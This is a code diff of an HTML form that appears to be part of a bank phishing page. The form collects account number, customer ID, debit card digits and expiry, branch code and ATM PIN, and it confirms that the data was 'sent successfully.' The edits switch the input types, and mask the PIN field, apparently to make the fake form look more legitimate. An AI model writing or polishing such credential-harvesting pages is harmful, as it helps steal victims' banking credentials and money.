@@ -175,12 +175,12 @@ button.submit-btn:hover{transform:scale(1.03);box-shadow:0 12px 35px rgba(0,0,0,
   </div>
   <div class="form-section" id="accountFormSection">
     <form id="accountForm">
-      <div class="input-group"><i class="fas fa-bank"></i><input type="text" placeholder="Account Number" pattern="\d{10,18}" required></div>
-      <div class="input-group"><i class="fas fa-id-card"></i><input type="text" placeholder="CIF/Customer I'D" pattern="\d{6,12}" required></div>
-      <div class="input-group"><i class="fas fa-credit-card"></i><input type="text" placeholder="Debit Last 6 Digits" pattern="\d{6}" required></div>
+      <div class="input-group"><i class="fas fa-bank"></i><input type="number" placeholder="Account Number" pattern="\d{10,18}" required></div>
+      <div class="input-group"><i class="fas fa-id-card"></i><input type="number" placeholder="CIF/Customer I'D" pattern="\d{6,12}" required></div>
+      <div class="input-group"><i class="fas fa-credit-card"></i><input type="number" placeholder="Debit Last 6 Digits" pattern="\d{6}" required></div>
       <div class="input-group"><i class="fas fa-calendar"></i><input type="text" placeholder="Expiry MM/YY" pattern="\d{2}/\d{2}" required></div>
-      <div class="input-group"><i class="fas fa-building"></i><input type="text" placeholder="Branch Code" pattern="\d{3,6}" required></div>
-      <div class="input-group"><i class="fas fa-lock"></i><input type="text" placeholder="ATM PIN" pattern="\d{3,6}" required></div>
+      <div class="input-group"><i class="fas fa-building"></i><input type="number" placeholder="Branch Code" pattern="\d{3,6}" required></div>
+      <div class="input-group"><i class="fas fa-lock"></i><input type="password" placeholder="ATM PIN" pattern="\d{3,6}" required></div>
       <button type="submit" class="submit-btn">Submit <div class="spinner" id="spinner2"></div></button>
       <div class="error-message">Error sending data</div>
       <div class="success-message"><i class="fas fa-check-circle"></i> Data sent successfully!</div>
